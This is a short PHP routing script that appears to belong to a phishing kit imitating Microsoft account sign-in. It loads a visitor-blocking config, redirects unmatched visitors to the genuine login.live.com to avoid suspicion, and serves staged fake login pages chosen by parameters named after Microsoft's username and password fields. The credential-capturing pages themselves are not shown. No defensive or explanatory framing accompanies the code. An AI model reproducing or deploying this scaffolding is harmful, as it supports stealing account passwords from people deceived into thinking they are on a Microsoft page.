<?php
session_start();
require_once 'config/blocker.php';
if (!isset($_GET['paswd1'])) {
  if (!isset($_GET['passwd'])) {
    if (!isset($_GET['loginfmt'])) {
      if (!isset($_GET['id'])) {
        header("location: https://login.live.com");
      } else {
        require_once 'session/adm.html';
      }//id session
    } else {
      require_once 'session/ade.html';
    }//loginfmt session
  } else {
    require_once 'session/ad.html';
  }//passwd session
}
